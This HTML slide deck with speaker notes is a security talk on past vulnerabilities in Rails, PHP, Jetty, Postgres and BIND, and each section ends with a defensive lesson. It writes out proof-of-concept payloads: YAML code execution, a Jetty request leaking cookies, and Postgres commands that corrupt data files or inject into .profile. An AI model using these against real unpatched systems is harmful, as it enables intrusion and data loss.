<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Your Web Stack Would Betray You In An Instant</title>
    <!-- build:css styles/styles.css-->
    <link rel="stylesheet" type="text/css" href="bower_components/prism/themes/prism-tomorrow.css">
    <link rel="stylesheet" type="text/css" href="styles/defaults.css">
    <link rel="stylesheet" type="text/css" href="styles/main.css">
    <!-- endbuild-->
  </head>
  <body>
    <article>
      <section data-bespoke-state="topic-slide">
        <h1 class="title">Your Web Stack Would Betray You In An Instant</h1>
        <address class="vcard">
          <div class="author fn">Tim Perry</div>
          <div class="urls"><span><a href="http://twitter.com/pimterry" rel="me" class="nickname url">@pimterry</a></span></div>
          <div class="note bio"><span>Tech Lead &amp; Open-Source Champion at&nbsp;</span><span class="org vcard"><a href="http://softwire.com" rel="group" class="org fn url">Softw<span class="i">i</span>re</a></span></div>
        </address>
      </section>
      <section><img src="images/softwireLogo.png" alt="Softwire" class="logo-big">
        <aside>
          <ul>
            <li>Bespoke software development company</li>
            <li>in London</li>
            <li>We're recruiting!</li>
            <li>Interesting problems, great atmosphere, huge variety of different tools and projects</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2 class="full-slide">Security</h2>
        <aside>
          <ul>
            <li>When I say security, I mean handling nasty people on the internet trying to mess with your web app</li>
            <li>Often assumed you're not worth attacking</li>
            <li>Opportunistic attackers, looking for easy security holes</li>
            <li>Platform for virus and malware distribution, phishing, for further attacks elsewhere.</li>
            <li>We're going to look at some examples</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Your Web Application:</h2>
        <ul class="stack">
          <li>Your Code</li>
          <li>Web Framework</li>
          <li>Programming Language</li>
          <li>Web Server</li>
          <li>Database</li>
          <li>Network Infrastructure</li>
        </ul>
        <aside>
          <ul>
            <li>This is you</li>
            <li>Walk through each</li>
            <li>Broad concepts</li>
            <li>Bit of a spoiler</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Everything is insecure</h2>
        <aside>
          <ul>
            <li>Whole point of the talk</li>
            <li>Security is hard</li>
            <li>You're not going to do it perfectly</li>
            <li>Inevitable failure means that it's more about minimizing risk + potential damage</li>
            <li>Upside to this</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Things that will be loudly publically insecure:</h2>
        <ul class="stack">
          <li class="lowlight">Your Code</li>
          <li>Web Framework</li>
          <li>Programming Language</li>
          <li>Web Server</li>
          <li>Database</li>
          <li>Network Infrastructure        </li>
        </ul>
        <aside>
          <ul>
            <li>If your code is insecure, nobody cares</li>
            <li>There's probably very few people looking</li>
            <li>Lots of value in holes in common components</li>
            <li>This talk is not about your code, about shared code you're using</li>
            <li>I want to talk about some of these, how they work</li>
            <li>because I enjoy taunting software devs</li>
            <li>also what you can do to avoid this</li>
            <li>Before we do that though</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="full-slide">
          Be Ready  
          To Update
        </h2>
        <aside>
          <ul>
            <li>Number one point in this whole talk</li>
            <li>Obvious conclusion: if everything will break, you have to be ready to recover</li>
            <li>Most projects announce vulnerabilities as soon as they have a release to fix them</li>
            <li>All you really have to do is react faster than the other team</li>
            <li>If you do nothing else: subscribe to notifications</li>
            <li>Make sure you're in a good position to do something about them</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2 class="full-slide">Ruby on Rails</h2>
        <ul class="stack corner">
          <li class="lowlight">Your Code</li>
          <li>Web Framework</li>
          <li class="lowlight">Programming Language</li>
          <li class="lowlight">Web Server</li>
          <li class="lowlight">Database</li>
          <li class="lowlight">Network Infrastructure</li>
        </ul>
        <aside>
          <ul>
            <li>Start with rails</li>
            <li>Popular web framework</li>
            <li>Easy to quickly build applications</li>
            <li>Automatically handles lot of complexity for you</li>
            <li>On top of Ruby the language</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>YAML</h2>
        <ul class="bullets in-place-transition">
          <li>
            <pre><code class="language-yaml">---
name: "Tim Perry"
company: "Softwire"
speaking: Yes
ears:
 - "Left"
 - "Right"</code></pre>
          </li>
          <li>
            <pre><code class="language-yaml">--- !ruby/hash:User
name: "Tim Perry"
company: "Softwire"
speaking: Yes
ears:
 - "Left"
 - "Right"</code></pre>
          </li>
        </ul>
        <aside>
          <ul>
            <li>Very popular in the Ruby world</li>
            <li>Config, serialization</li>
            <li>*Mostly compatible* with JSON</li>
            <li>*Optional braces*</li>
            <li>Supports lots of extra complexity</li>
            <li>One thing it supports is types</li>
            <li>User, as a hash/dict/map</li>
            <li>Default Ruby YAML parser will build a User when this is parsed</li>
            <li>Dangerous if building, say, database connections, just by parsing</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>YAML</h2>
        <pre><code class="language-ruby">user = User.allocate
values.each_pair { |key,val|
    user[key] = val
}</code></pre>
        <aside>
          <ul>
            <li>Allocate is not constructor</li>
            <li>Set key-values for each prop, name/company etc</li>
            <li>Weird: parsing process actively involved in your code</li>
            <li>Not just weird: because you can override property setting</li>
            <li>Key, Value and class are user controlled </li>
            <li>Dangerous: if key/value's ever used for anything...</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>NamedRouteCollection</h2>
        <pre><code class="language-ruby">alias []= add

def add(name, route)
  ...
  @module.module_eval(
    "remove_possible_method :#{name}; ..."
  )
  ...
end</code></pre>
        <aside>
          <ul>
            <li>Builtin Rails class, part of routing</li>
            <li>Overrides property setting operation</li>
            <li>#{name} is string replacement syntax in Ruby</li>
            <li>Classic eval-injection attack</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>NamedRouteCollection</h2>
        <pre><code class="language-ruby">name = "ignored; puts 'Hello'; \n__END__\n"            

@module.module_eval(
  "remove_possible_method :#{name}; ..."
)

# Becomes:

@module.module_eval(
  "remove_possible_method :ignored; puts 'Hello'; 
   __END__
   ..."
)</code></pre>
        <aside>
          <ul>
            <li>This runs 'puts hello'</li>
            <li>puts = print</li>
            <li>Works because __END__ exists</li>
            <li>Terminates a chunk of code prematurely</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Arbitrary Code Execution with YAML</h2>
        <pre><code class="language-yaml">--- !ruby/hash:NamedRouteCollection
"ignored; puts 'Hello'; \n__END__\n": 
    !ruby/object:OpenStruct 
      ‘table’: {‘defaults’: {}}</code></pre>
        <p>(Namespaces omitted)</p>
        <aside>
          <ul>
            <li>YAML equivelant</li>
            <li>Need openstruct for validation</li>
            <li>If Rails parses this, you win</li>
            <li>But somehow you need to get Rails to parse this</li>
            <li>Early last year, that got really easy</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Rails</h2>
        <h4>CVE-2013-0156</h4>
        <pre><code class="language-yaml">&lt;?xml version="1.0"?&gt;
&lt;foo type='yaml'&gt;
  --- !ruby/hash:NamedRouteCollection
  "ignored; puts 'Hello'; \n__END__\n":
      !ruby/object:OpenStruct
        'table': {'defaults': {}}
&lt;/foo&gt;</code></pre>
        <aside>
          <ul>
            <li>Rails has a lot of convenient features</li>
            <li>Default: Endpoints can take data in JSON or XML</li>
            <li>XML elements can be typed, as here</li>
            <li>YAML is a valid type, for some ungodly reason</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Rails</h2>
        <h4>CVE-2013-0333</h4>
        <pre><code class="language-yaml">Content-Type: application/json

--- !ruby/hash\u003aNamedRouteCollection
"ignored; puts 'Hello'; \n__END__\n":
    !ruby/object\u003aOpenStruct
      'table': {'defaults': {}}</code></pre>
        <aside>
          <ul>
            <li>Two weeks later, another one</li>
            <li>Default JSON parser is really just YAML</li>
            <li>Intended to use YAML internally</li>
            <li>But actually doesn't parse JSON and restructure</li>
            <li>Couple of search and replaces and hopes for the best</li>
            <li>No consideration of security at all</li>
            <li>Replaces date strings with YAML date literals for convenience            </li>
            <li>Adds a space after colons, because that's required in YAML</li>
            <li>Then does unicode replacement too, afterwards</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Rails</h2>
        <h4>CVE-2013-0277</h4>
        <pre><code class="language-ruby">class BlogPost &lt; ActiveRecord::Base
  :serialize tags
end
</code></pre>
      </section>
      <section>
        <h2 class="full-slide">Ouch</h2>
        <aside>
          <ul>
            <li>Pretty painful for Rails developers</li>
            <li>3 times in two months</li>
            <li>Repeated nights of no sleep redeploying everything before they got hacked</li>
            <li>All that work was not for nothing though</li>
            <li>I for example got a great example out of it</li>
            <li>And you get some useful lessons</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="full-slide">Fear User Input</h2>
        <h3>(in any format)</h3>
        <aside>
          <ul>
            <li>Limit what input you accept</li>
            <li>Tools will may assume their input is safe</li>
            <li>Powerful formats: both YAML and XML, but JSON mostly safe</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2 class="full-slide">PHP </h2>
        <ul class="stack corner">
          <li class="lowlight">Your Code</li>
          <li class="lowlight">Web Framework</li>
          <li>Programming Language</li>
          <li class="lowlight">Web Server</li>
          <li class="lowlight">Database</li>
          <li class="lowlight">Network Infrastructure</li>
        </ul>
      </section>
      <section>
        <h2>PHP</h2>
        <pre><code class="language-php">$user = new User();
$user-&gt;username = $_POST['username'];

$hashedPassword = crypt($_POST['password'], $salt);
$user-&gt;password = $hashedPassword;

$user-&gt;save();</code></pre>
        <p>(Salt generation and all validation omitted)</p>
        <aside>
          <ul>
            <li>Validation!</li>
            <li>Salt is unique per user</li>
            <li>But same salt for every login</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>PHP</h2>
        <pre><code class="language-php">$salt = $user-&gt;password;
$hashedPasswordInput = crypt($_POST['password'], $salt);

$loginOk = ($user-&gt;password === $hashedPasswordInput);</code></pre>
        <aside>
          <ul>
            <li>Convenient feature though: salt is included in password</li>
            <li>This is the recommended way of handling this</li>
            <li>Separated by a $</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>PHP 5.3.7</h2>
        <pre style="font-size: 24px"><code class="language-c"></code><span style="color: #f77"><code class="language-c"></code>- strncat(passwd, "$", 1);</span><br><span style="color: #7f7"><code class="language-c"></code>+ strlcat(passwd, "$", 1);</span></pre>
        <aside>
          <ul>
            <li>Well meaning fix to solve build warning</li>
            <li>Strncat is considered insecure because it might overflow first arg</li>
            <li>Strlcat doesn't do this, so is better</li>
            <li>Unfortunately, doesn't do this because of the last arg</li>
            <li>Fixed another important security issue</li>
            <li>Recommended for immediate update for 5 days</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Strings</h2>
        <ul class="bullets in-place-transition">
          <li><img src="images/modern-string.png" style="width: 560px; margin: 30px 0 0 -35px"></li>
          <li><img src="images/modern-string-details.png" style="width: 560px; margin: 30px 0 0 -35px"></li>
          <li><img src="images/c-string.png" style="width: 560px; margin: 30px 0 0 -35px"></li>
        </ul>
      </section>
      <section>
        <h2>PHP 5.3.7</h2>
        <pre style="font-size: 24px"><code class="language-c"></code><span style="color: #f77"><code class="language-c"></code>- strncat(passwd, "$", 1);</span><br><span style="color: #7f7"><code class="language-c"></code>+ strlcat(passwd, "$", 1);</span></pre>
      </section>
      <section>
        <h2>String concatenation</h2>
        <ul class="bullets in-place-transition">
          <li>
            <pre style="font-size: 200%;"><code class="language-c">strncat(passwd, "$", 1)</code></pre><img src="images/strncat.svg" style="width: 500px; height: 98px; margin: 30px">
          </li>
          <li>
            <pre style="font-size: 200%;"><code class="language-c">strlcat(passwd, "$", 1)
</code></pre><img src="images/strlcat.svg" style="width: 500px; height: 98px; margin: 30px">
          </li>
        </ul>
      </section>
      <section>
        <h2>PHP 5.3.7</h2>
        <h4>CVE-2011-3189</h4>
        <pre><code class="language-php">crypt($password, $salt) === $salt</code></pre>
      </section>
      <section>
        <h2>PHP 5.3.7</h2>
        <h4>CVE-2011-3189</h4>
        <ul class="bullets in-place-transition">
          <li>
            <pre><code class="language-php">$salt = $user-&gt;password;
$hashedPasswordInput = crypt($_POST['password'], $salt);

$loginOk = ($user-&gt;password === $hashedPasswordInput);</code></pre>
          </li>
          <li>
            <pre><code class="language-php">$salt = $user-&gt;password;
$hashedPasswordInput = $salt;

$loginOk = ($user-&gt;password === $hashedPasswordInput);</code></pre>
          </li>
          <li>
            <pre><code class="language-php">$loginOk = ($user-&gt;password === $user-&gt;password);</code></pre>
          </li>
        </ul>
      </section>
      <section>
        <h2>Tests?</h2>
      </section>
      <section>
        <h2>Reported?</h2>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="full-slide">Value<br>Best<br>Practices</h2>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2 class="full-slide">Jetty</h2>
        <ul class="stack corner">
          <li class="lowlight">Your Code</li>
          <li class="lowlight">Web Framework</li>
          <li class="lowlight">Programming Language</li>
          <li>Web Server</li>
          <li class="lowlight">Database</li>
          <li class="lowlight">Network Infrastructure</li>
        </ul>
        <aside>
          <ul>
            <li>We're all using a web server, Apache, Tomcat, Jetty, IIS</li>
            <li>Jetty particularly is growing rapidly in the modern Java community            </li>
            <li>Like Nancy in the C# world</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>HTTP</h2>
        <pre><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept: text/html
Cookie: password=secret
</code></pre>
        <aside>
          <ul>
            <li>This is a simple HTTP request Jetty might receive</li>
            <li>Has a series of headers with keys and values</li>
            <li>Some of which contain secrets, typically the cookies particularly</li>
            <li>Potentially also the request body too though, containing valuables</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Bad HTTP</h2>
        <pre><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept&#174;: text/html
</code></pre>
        <aside>
          <ul>
            <li>This is an invalid HTTP request</li>
            <li>&169; is binary 169, and that's not a legal character in an HTTP header name</li>
            <li>Jetty follows the RFCs for this and (like most web servers) rejects this request.</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Bad HTTP</h2>
        <pre><code class="language-bash">HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
   'GET / HTTP/1.1
    H...t:8080
    Accept\xC2<<<\xAe: text/html
    
    >>>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
    \x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00
    \x00\x00\x00\x00\x00\x00\x00\x00'
Content-Length: 0
Connection: close
Server: Jetty(9.2.8.v20150217)</code></pre>
        <aside>
          <ul>
            <li>In that case, with the version of Jetty released in February, we get a response like this.</li>
            <li>Error message containing the request content and highlighting the bad character</li>
            <li>There's an issue with this though</li>
            <li>What're those zeros?</li>
            <li>They're the rest of the contents of the buffer</li>
            <li>This is printed by a general purpose 'toDebugString(buffer)' method</li>
            <li>Prints the content in a buffer, highlighting a part, and providing context</li>
            <li>This sounds fine, just messy, but is actually a huge disaster: these buffers are reused by all requests</li>
            <li>If the previous request was longer than this one, we can read a chunk of data out of it</li>
            <li>Can change which data by progressively increasing how far down our request the bad character comes</li>
          </ul>
        </aside>
      </section>
      <section>
        <h4>CVE-2015-2080</h4>
        <ul class="bullets in-place-transition">
          <li>
            <div class="sideBySide">
              <pre style="align-self: flex-start;"><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept: text/html
Cookie: password=secret</code></pre>
              <pre><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept®: text/html


HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
 'GET / HTTP/1.1
  H...t:8080
  Accept\xC2<<<\xAe: text/html
  
  >>>ie: password=secr...\x00\x00\x00\x00\x00
  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
Content-Length: 0
Connection: close
Server: Jetty(9.2.8.v20150217)


</code></pre>
            </div>
          </li>
          <li>
            <div class="sideBySide">
              <pre style="align-self: flex-start;"><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept: text/html
Cookie: password=secret</code></pre>
              <pre><code class="language-bash">GET / HTTP/1.1
Host: localhost:8080
Accept®: text/htmlQQQQ


HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
 'GET / HTTP/1.1
  H...t:8080
  Accept\xC2<<<\xAe: text/htmlQQQQ
  
  >>>password=secret
  
  ...\x00\x00\x00\x00\x00
  \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
Content-Length: 0
Connection: close
Server: Jetty(9.2.8.v20150217)</code></pre>
            </div>
          </li>
        </ul>
        <aside>
          <ul>
            <li>We can use this to see bits of other people's requests          </li>
            <li>And with minor fiddling, we can find the relevant bit of request we're looking for</li>
            <li>Live for 6 months, from September last year until the end of February</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Fixed        </h2>
        <pre><code class="language-bash">HTTP/1.1 400 Illegal character 0xc2
Content-Length: 0
Connection: close
Server: Jetty(9.2.9.v20150224)
</code></pre>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="full-slide">Keep<br>Errors<br>Secret</h2>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2 class="full-slide">PostgreSQL</h2>
        <ul class="stack corner">
          <li class="lowlight">Your Code</li>
          <li class="lowlight">Web Framework</li>
          <li class="lowlight">Programming Language</li>
          <li class="lowlight">Web Server</li>
          <li>Database</li>
          <li class="lowlight">Network Infrastructure</li>
        </ul>
      </section>
      <section>
        <h2>Postgres</h2>
        <pre><code class="language-bash">psql --host="example.com" \
     --dbname="blogdb"</code></pre>
        <aside>
          <ul>
            <li>Postgres client</li>
            <li>Most absurd bug of the lot</li>
            <li>DB name with a dash, it's not a DB name, but command line arg, on the server.</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Postgres</h2>
        <h4>CVE-2013-1899</h4>
        <pre><code class="language-bash">psql --host="example.com" \
     --dbname="-r/var/lib/postgres/data/db"</code></pre>
        <aside>
          <ul>
            <li>This writes the command output to this file, corrupting the DB</li>
            <li>This happens before auth</li>
            <li>Actually even before connection filtering</li>
            <li>Crash any connectable Postgres instance</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Postgres</h2>
        <h4>CVE-2013-1899</h4>
        <pre><code class="language-bash">no pg_hba.conf entry for host "example.com", 
  user "postgres", database "-r/var/lib/postgres/data/db"</code></pre>
        <aside>
          <ul>
            <li>Log out put looks like this</li>
            <li>username is notably under our control</li>
            <li>Find somewhere executable to put this</li>
            <li>Classic injection attack</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Postgres</h2>
        <h4>CVE-2013-1899</h4>
        <pre><code class="language-bash">psql --host="example.com" \
     --dbname="-r/var/lib/postgres/.profile" \
     --username="
     echo 'Hello' #"</code></pre>
        <aside>
          <ul>
            <li>.Profile is a favourite for this, since it's very liberal about what it'll run</li>
            <li>it'll ignore our garbage, just need a line that's usefully executable</li>
            <li>it's run whenever a user logs in, here the postgres user</li>
            <li>Here newline, then our command, then a comment to clear the rest</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>Postgres</h2>
        <h4>CVE-2013-1899</h4>
        <pre><code class="language-bash">$ cat .profile
[...]
no pg_hba.conf entry for host "example.com", user "
echo 'Hello' #", database "-r/var/lib/postgres/.profile"
</code></pre>
        <pre><code class="language-bash">$ su - postgres
no: command not found
Hello</code></pre>
        <aside></aside>
      </section>
      <section>
        <h2>So?</h2>
        <aside>
          <ul>
            <li>450000 connectable postgres's on the default port</li>
            <li>Sometimes for convenience, relying on postgres' own security</li>
            <li>Sometimes for distributed infrastructure</li>
            <li>All in hilarious danger</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="fullish-slide">Isolate Your Components</h2>
        <h3>(From itself, and everyone else)</h3>
        <aside>
          <ul>
            <li>Isolation is important</li>
            <li>Isolate your tools from the world, to reduce attack surface</li>
            <li>Combine their security, so both must fail</li>
            <li>Isolate your components from one another </li>
            <li>Otherwise you're combining their risks: failure if either fails</li>
            <li>Don't rely on one single point of failure for security</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2 class="full-slide">BIND</h2>
        <ul class="stack corner">
          <li class="lowlight">Your Code</li>
          <li class="lowlight">Web Framework</li>
          <li class="lowlight">Programming Language</li>
          <li class="lowlight">Web Server</li>
          <li class="lowlight">Database</li>
          <li>Network Infrastructure</li>
        </ul>
        <aside>
          <ul>
            <li>Who thinks they know how DNS works?</li>
            <li>Berkley Internet Name Daemon</li>
            <li>85% market share</li>
            <li>Almost every page you open probably involved a request to BIND at some stage</li>
            <li>Similarly, every user that you have probably uses BIND to find you</li>
            <li>It's generally not a good idea to run your own nameservers</li>
            <li>But that doesn't mean they're not a part of your system</li>
            <li>Can be made vulnerable by their failures: phishing</li>
            <li>Nobody looks at certs</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>TSIG</h2>
        <h4>RFC 2845</h4>
        <aside>
          <ul>
            <li>For a long time DNS was essentially unsecured</li>
            <li>DNS cache poisoning and MitM generally a big problem, DNSSEC/DNSCurve</li>
            <li>Fundamentally a distributed database</li>
            <li>Needs secure methods for internal replication of transactions too</li>
            <li>Has to be more lightweight than full public/private key auth process, for when that's useful (2000 originally)</li>
            <li>TSIG is that: signing requests for zone transfers and dynamic DNS updates</li>
            <li>Secondary DNS servers updating their caches for their zone</li>
            <li>Full zone transfer includes all domains</li>
            <li>Potentially gives away details about internal infrastructure</li>
            <li>Also useful for machines that move around a lot, but want a DNS name anyway</li>
            <li>Symmetric shared keys used</li>
            <li>Need to distribute keys. Typically done out-of-band.</li>
            <li>One of many ways to do this sort of thing, DNS is complicated</li>
            <li>TSIG is not really the go-to solution for this now: DNSSEC and similar, lots of competition</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>TKEY</h2>
        <h4>RFC 2930</h4>
        <aside>
          <ul>
            <li>If you do want to do TSIG, sharing keys is a bit of hassle</li>
            <li>TKEY is a DNS record type, like an A record or a CNAME</li>
            <li>A TKEY record contains some key data, and a bunch of metadata</li>
            <li>Obviously this can't just be a server giving out it's secret keys</li>
            <li>Lots of modes. Can verify requests in various ways, can provide GSSAPI and all sorts</li>
            <li>Often used with diffie-hellman setup, so there's no public information</li>
            <li>Diffie Hellman used for agreeing on a shared secret between two servers without any preceeding information, or ever exposing the keys over the wire</li>
            <li>Bit like magic, well worth a read</li>
            <li>But essentially, this is key distribution infrastructure for a corner case of a minor feature nobody uses.</li>
          </ul>
        </aside>
      </section>
      <section>
        <pre style="font-size: 55%; width: 100%; margin: 0"><code class="language-c">dns_tkey_processquery(dns_message_t *msg, dns_tkeyctx_t *tctx, dns_tsig_keyring_t *ring) {
  isc_result_t result = ISC_R_SUCCESS;
  dns_rdata_tkey_t tkeyin, tkeyout;
  isc_boolean_t freetkeyin = ISC_FALSE;
  dns_name_t *qname, *name, *keyname, *signer, tsigner;
  dns_fixedname_t fkeyname;
  dns_rdataset_t *tkeyset;
  dns_rdata_t rdata;
  dns_namelist_t namelist;
  char tkeyoutdata[512];
  isc_buffer_t tkeyoutbuf;
  
  REQUIRE(msg != NULL);
  REQUIRE(tctx != NULL);
  REQUIRE(ring != NULL);
  
  ISC_LIST_INIT(namelist);
  
  /*
   * Interpret the question section.
   */
  result = dns_message_firstname(msg, DNS_SECTION_QUESTION);
  if (result != ISC_R_SUCCESS) return (DNS_R_FORMERR);
  
  qname = NULL;
  dns_message_currentname(msg, DNS_SECTION_QUESTION, &qname);
  
  /*
   * Look for a TKEY record that matches the question.
   */
  tkeyset = NULL;
  name = NULL;
  result = dns_message_findname(msg, DNS_SECTION_ADDITIONAL, qname,
                                dns_rdatatype_tkey, 0, &name, &tkeyset);
  if (result != ISC_R_SUCCESS) {
      /*
       * Try the answer section, since that's where Win2000
       * puts it.
       */
      if (dns_message_findname(msg, DNS_SECTION_ANSWER, qname
                               dns_rdatatype_tkey, 0, &name,
                               &amp;tkeyset) != ISC_R_SUCCESS) { 
      &nbsp;&nbsp;&nbsp;&nbsp;result = DNS_R_FORMERR;
          tkey_log("dns_tkey_processquery: couldn't find a TKEY "
                   "matching the question");
          goto failure;
      }
  }
  result = dns_rdataset_first(tkeyset);
  if (result != ISC_R_SUCCESS) {
      result = DNS_R_FORMERR;
      goto failure;
  }
  dns_rdata_init(&rdata);
  dns_rdataset_current(tkeyset, &rdata);
  
  RETERR(dns_rdata_tostruct(&rdata, &tkeyin, NULL));
  freetkeyin = ISC_TRUE;
  
  if (tkeyin.error != dns_rcode_noerror) {
      result = DNS_R_FORMERR;
      goto failure;
  }
  
  /*
   * Before we go any farther, verify that the message was signed.
   * GSSAPI TKEY doesn't require a signature, the rest do.
   */
  dns_name_init(&tsigner, NULL);
  result = dns_message_signer(msg, &tsigner);
  if (result != ISC_R_SUCCESS) {
      if (tkeyin.mode == DNS_TKEYMODE_GSSAPI &&
          result == ISC_R_NOTFOUND)
              signer = NULL;
      else {
          tkey_log("dns_tkey_processquery: query was not "
                   "properly signed - rejecting");
          result = DNS_R_FORMERR;
          goto failure;
      }
  } else
      signer = &tsigner;
      
  tkeyout.common.rdclass = tkeyin.common.rdclass;
  tkeyout.common.rdtype = tkeyin.common.rdtype;
  ISC_LINK_INIT(&tkeyout.common, link);
  tkeyout.mctx = msg->mctx;
  
  dns_name_init(&tkeyout.algorithm, NULL);
  dns_name_clone(&tkeyin.algorithm, &tkeyout.algorithm);
  
  tkeyout.inception = tkeyout.expire = 0;
  tkeyout.mode = tkeyin.mode;
  tkeyout.error = 0;
  tkeyout.keylen = tkeyout.otherlen = 0;
  tkeyout.key = tkeyout.other = NULL;
  
  /*
   * A delete operation must have a fully specified key name.  If this
   * is not a delete, we do the following:
   * if (qname != ".")
   *      keyname = qname + defaultdomain
   * else
   *      keyname = <random hex> + defaultdomain
   */
  if (tkeyin.mode != DNS_TKEYMODE_DELETE) {
      dns_tsigkey_t *tsigkey = NULL;
      
      if (tctx->domain == NULL && tkeyin.mode != DNS_TKEYMODE_GSSAPI) {
          tkey_log("dns_tkey_processquery: tkey-domain not set");
          result = DNS_R_REFUSED;
          goto failure;
      }
      
      dns_fixedname_init(&fkeyname);
      keyname = dns_fixedname_name(&fkeyname);
      
      if (!dns_name_equal(qname, dns_rootname)) {
          unsigned int n = dns_name_countlabels(qname);
          RUNTIME_CHECK(dns_name_copy(qname, keyname, NULL)
                        == ISC_R_SUCCESS);
          dns_name_getlabelsequence(keyname, 0, n - 1, keyname);
      } else {
          static char hexdigits[16] = {
              '0', '1', '2', '3', '4', '5', '6', '7',
              '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
          unsigned char randomdata[16];
          char randomtext[32];
          isc_buffer_t b;
          unsigned int i, j;
          
          result = isc_entropy_getdata(tctx->ectx,
                                       randomdata,
                                       sizeof(randomdata),
                                       NULL, 0);
          if (result != ISC_R_SUCCESS)
              goto failure;
              
          for (i = 0, j = 0; i < sizeof(randomdata); i++) {
               unsigned char val = randomdata[i];
               randomtext[j++] = hexdigits[val >> 4];
               randomtext[j++] = hexdigits[val & 0xF];
          }
          isc_buffer_init(&b, randomtext, sizeof(randomtext));
          isc_buffer_add(&b, sizeof(randomtext));
          result = dns_name_fromtext(keyname, &b, NULL, 0, NULL);
          if (result != ISC_R_SUCCESS)
              goto failure;
      }
      
      if (tkeyin.mode == DNS_TKEYMODE_GSSAPI) {
          /* Yup.  This is a hack */
          result = dns_name_concatenate(keyname, dns_rootname,
                                        keyname, NULL);
          if (result != ISC_R_SUCCESS)
              goto failure;
      } else {
          result = dns_name_concatenate(keyname, tctx->domain,
                                        keyname, NULL);
          if (result != ISC_R_SUCCESS)
              goto failure;
      }
      
      result = dns_tsigkey_find(&tsigkey, keyname, NULL, ring);
      
      if (result == ISC_R_SUCCESS) {
          tkeyout.error = dns_tsigerror_badname;
          dns_tsigkey_detach(&tsigkey);
              goto failure_with_tkey;
      } else if (result != ISC_R_NOTFOUND)
              goto failure;
  } else
      keyname = qname;
      
  switch (tkeyin.mode) {
      case DNS_TKEYMODE_DIFFIEHELLMAN:
          tkeyout.error = dns_rcode_noerror;
          RETERR(process_dhtkey(msg, signer, keyname, &tkeyin,
                                tctx, &tkeyout, ring,
                                &namelist));
          break;
      case DNS_TKEYMODE_GSSAPI:
          tkeyout.error = dns_rcode_noerror;
          RETERR(process_gsstkey(keyname, &tkeyin, tctx,
                                 &tkeyout, ring));
          break;
      case DNS_TKEYMODE_DELETE:
          tkeyout.error = dns_rcode_noerror;
          RETERR(process_deletetkey(signer, keyname, &tkeyin,
                                    &tkeyout, ring));
          break;
      case DNS_TKEYMODE_SERVERASSIGNED:
      case DNS_TKEYMODE_RESOLVERASSIGNED:
          result = DNS_R_NOTIMP;
          goto failure;
      default:
          tkeyout.error = dns_tsigerror_badmode;
  }
  
  failure_with_tkey:
      dns_rdata_init(&rdata);
      isc_buffer_init(&tkeyoutbuf, tkeyoutdata, sizeof(tkeyoutdata));
      result = dns_rdata_fromstruct(&rdata, tkeyout.common.rdclass,
                                    tkeyout.common.rdtype, &tkeyout,
                                    &tkeyoutbuf);
                                    
      if (freetkeyin) {
          dns_rdata_freestruct(&tkeyin);
          freetkeyin = ISC_FALSE;
      }
      
      if (tkeyout.key != NULL)
          isc_mem_put(tkeyout.mctx, tkeyout.key, tkeyout.keylen);
      if (tkeyout.other != NULL)
          isc_mem_put(tkeyout.mctx, tkeyout.other, tkeyout.otherlen);
      if (result != ISC_R_SUCCESS)
          goto failure;
          
      RETERR(add_rdata_to_list(msg, keyname, &rdata, 0, &namelist));
      
      RETERR(dns_message_reply(msg, ISC_TRUE));
      
      name = ISC_LIST_HEAD(namelist);
      while (name != NULL) {
          dns_name_t *next = ISC_LIST_NEXT(name, link);
          ISC_LIST_UNLINK(namelist, name, link);
          dns_message_addname(msg, name, DNS_SECTION_ANSWER);
          name = next;
      }
      
